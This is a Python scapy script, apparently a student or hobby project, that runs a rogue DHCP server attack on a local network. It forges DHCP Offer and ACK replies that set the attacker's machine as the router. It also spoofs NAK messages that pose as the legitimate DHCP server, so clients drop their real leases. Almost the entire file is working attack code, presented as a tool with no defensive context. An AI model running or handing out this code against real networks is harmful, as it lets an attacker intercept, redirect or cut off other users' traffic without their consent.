__author__ = 'Yuxibro'
import logging
import socket
logging.getLogger("scapy").setLevel(1)
from scapy.all import conf,sendp,srp1,sniff,Ether,IP,ARP,UDP,BOOTP,DHCP,get_if_raw_hwaddr,random

conf.checkIPaddr = False
fam,hw = get_if_raw_hwaddr(conf.iface)

myIPv4Address = socket.gethostbyname(socket.gethostname())
splittedIPv4 = myIPv4Address.split(".")               # get current IPV4 and split it into array
print "Our IPV4 address: ",myIPv4Address      #rejoin the string for printing


# takes an splitted IPv4 address array and assemble it back to standard IPv4 address with "."
def reassembleIPAddress(splittedIPArrary):
    resultString = ""
    for index in range(len(splittedIPArrary)):
        if index < len(splittedIPArrary)-1:
            resultString+=splittedIPArrary[index]+"."
        else:
            resultString+=splittedIPArrary[index]
    return resultString


LegitDHCPServer = {'MAC':"",'IP':""} # using dictionary to store server info
rougeServer = {'MAC':hw,'IP':myIPv4Address,'NAKReplyCounter':0}
maxNAKReply = 2


def dhcp_discover(pkt):
    global LegitDHCPServer
    print "Source: " +pkt[Ether].src
    print "Dest: " +pkt[Ether].dst
    #print DHCPServer
    for opt in pkt[DHCP].options:
        if LegitDHCPServer['MAC'] == "" and opt[0] == "message-type" and opt[1] == 2:
            print "Init: "
            LegitDHCPServer['MAC'] = pkt[Ether].src
            LegitDHCPServer['IP'] = pkt[IP].src
            print "DHCPServer: ",LegitDHCPServer
        elif opt == 'end':
            break
        elif opt == 'pad':
            break
        #print opt


# Server need to respond to "Discover" & "Request" msg
def dhcp_manipulate(pkt):
    global LegitDHCPServer,splittedIPv4,rougeServer,maxNAKReply
    #print "\n##############################"
    #print "Source: " +pkt[Ether].src
    #print "Dest: " +pkt[Ether].dst
    #pkt.show()
    tempOptions = {}
    for opt in pkt[DHCP].options:
        if opt == 'end':
            break
        elif opt == 'pad':
            break
        else:
            tempOptions[opt[0]] = opt[1]    #   store the option tuple into dictionary
            #print opt
    #print tempOptions
    if tempOptions['message-type'] == 1: # if msg is DHCP discover msg
        print "Discover:"
        #pkt.show()
        #TODO: Normal Server offer options:{'server_id': '136.159.253.46', 'lease_time': 3600, 'name_server': '136.159.1.21', 'domain': 'ucalgary.ca', 46: '\x08', 'subnet_mask': '255.255.255.0', 'message-type': 2, 'router': '10.13.27.1'}
        randomedIPv4Addr = splittedIPv4
        randomedIPv4Addr[3]=str(random.randint(1,255))
        offerIPAddress=reassembleIPAddress(randomedIPv4Addr)
        tmpRouter_id = splittedIPv4
        tmpRouter_id[3] = '1'
        router_id = reassembleIPAddress(tmpRouter_id)
        print "Src: ",pkt[Ether].src
        #TODO: Conver chaddr to Hex otherwise Wireshark will say it's different
        OfferPacket = Ether(src=rougeServer['MAC'], dst=pkt[Ether].src)/IP(src=rougeServer['IP'],dst=offerIPAddress)/UDP(sport=67,dport=68)\
                       /BOOTP(op=2, yiaddr= offerIPAddress,ciaddr=pkt[IP].src,siaddr="0.0.0.0",chaddr=pkt[BOOTP].chaddr,giaddr=rougeServer['IP'], xid=pkt[BOOTP].xid)\
                       /DHCP(options=[('message-type','offer'),('server_id',rougeServer['IP']),('lease_time',3600),('subnet_mask','255.255.255.0'),('router', myIPv4Address), ('end')])
        sendp(OfferPacket)
        #print "Offer from rouge:"
        OfferPacket.show()
        print "Offer from rouge:"
    elif tempOptions['message-type']==3: #if msg is Request message
        print "Request:"
        pkt.show()
        print('From Legit')
        # Fake NAK msg send by pretending legit DHCP Server. When we see request packet for
        if tempOptions.has_key('server_id'):
            if rougeServer['NAKReplyCounter']<maxNAKReply and LegitDHCPServer['MAC']==tempOptions['server_id']:
                NAKreply = Ether(src=LegitDHCPServer['MAC'], dst=pkt[Ether].dst)/IP(src=LegitDHCPServer['IP'],dst=pkt[IP].dst)/UDP(sport=67,dport=68)\
                           /BOOTP(op=2, ciaddr=pkt[IP].src,siaddr=pkt[IP].dst,chaddr=pkt[Ether].src, xid=pkt[BOOTP].xid)\
                           /DHCP(options=[('server_id',LegitDHCPServer['IP']),('message-type','nak'), ('end')])
                sendp(NAKreply)
                print "NAK sent out..."
                rougeServer['NAKReplyCounter'] += 1 # increment NAK msg number
        AckPacket = Ether(src=rougeServer['MAC'], dst=pkt[Ether].src)/IP(src=rougeServer['IP'],dst=tempOptions['requested_addr'])/UDP(sport=67,dport=68)\
                       /BOOTP(op=2, yiaddr=tempOptions['requested_addr'],ciaddr="0.0.0.0",siaddr="0.0.0.0",chaddr=pkt[BOOTP].chaddr,sname=pkt[BOOTP].sname,file=pkt[BOOTP].file,giaddr=rougeServer['IP'], xid=pkt[BOOTP].xid)\
                       /DHCP(options=[('message-type','ack'),('server_id',rougeServer['IP']),('lease_time',3600),('subnet_mask','255.255.255.0'),('router', myIPv4Address), ('end')])
        AckPacket.show()
        sendp(AckPacket)
    elif tempOptions['message-type'] == 2:
        pkt.show()
        print('From Legit')
    elif tempOptions['message-type'] == 5:
        pkt.show()
        print "From Legit"

sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type","discover")]),count=1)

#sniff(iface="en0",filter="udp and (port 67 or 68)",prn=dhcp_discover,count=1)
sniff(iface="en0",filter="udp and (port 67 or 68)", prn=dhcp_manipulate, store=0)